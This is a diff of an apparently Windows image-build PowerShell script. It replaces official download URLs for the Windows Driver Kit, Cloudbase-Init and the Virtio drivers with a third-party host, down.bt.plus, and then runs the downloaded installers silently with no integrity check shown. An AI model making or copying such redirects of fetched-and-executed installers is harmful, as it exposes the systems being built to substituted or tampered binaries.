@@ -64,7 +64,7 @@ try
             # Download the WDK installer.
             $Host.UI.RawUI.WindowTitle = "Downloading Windows Driver Kit..."
             [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-            Invoke-WebRequest "https://download.microsoft.com/download/8/6/9/86925F0F-D57A-4BA4-8278-861B6876D78E/wdk/wdksetup.exe" -Outfile "c:\wdksetup.exe"
+            Invoke-WebRequest "https://down.bt.plus/wdksetup.exe" -Outfile "c:\wdksetup.exe"
 
             # Run the installer.
             $Host.UI.RawUI.WindowTitle = "Installing Windows Driver Kit..."
@@ -89,7 +89,7 @@ try
 
         $Host.UI.RawUI.WindowTitle = "Installing Cloudbase-Init..."
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-        Invoke-WebRequest "https://cloudbase.it/downloads/CloudbaseInitSetup_Stable_x64.msi" -Outfile "c:\cloudbase.msi"
+        Invoke-WebRequest "https://down.bt.plus/CloudbaseInitSetup_Stable_x64.msi" -Outfile "c:\cloudbase.msi"
         $cloudbaseInitLog = "$ENV:Temp\cloudbase_init.log"
         $serialPortName = @(Get-WmiObject Win32_SerialPort)[0].DeviceId
         $p = Start-Process -Wait -PassThru -FilePath msiexec -ArgumentList "/i c:\cloudbase.msi /qn /norestart /l*v $cloudbaseInitLog LOGGINGSERIALPORTNAME=$serialPortName"
@@ -102,8 +102,8 @@ try
         $Host.UI.RawUI.WindowTitle = "Installing Virtio Drivers..."
         certutil -addstore "TrustedPublisher" A:\rh.cer
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-        Invoke-WebRequest "https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/stable-virtio/virtio-win-gt-x64.msi" -Outfile "c:\virtio.msi"
-        Invoke-WebRequest "https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/stable-virtio/virtio-win-guest-tools.exe" -Outfile "c:\virtio.exe"
+        Invoke-WebRequest "https://down.bt.plus/virtio-win-gt-x64.msi" -Outfile "c:\virtio.msi"
+        Invoke-WebRequest "https://down.bt.plus/virtio-win-guest-tools.exe" -Outfile "c:\virtio.exe"
         $virtioLog = "$ENV:Temp\virtio.log"
         $serialPortName = @(Get-WmiObject Win32_SerialPort)[0].DeviceId
         $p = Start-Process -Wait -PassThru -FilePath msiexec -ArgumentList "/a c:\virtio.msi /qn /norestart /l*v $virtioLog LOGGINGSERIALPORTNAME=$serialPortName"
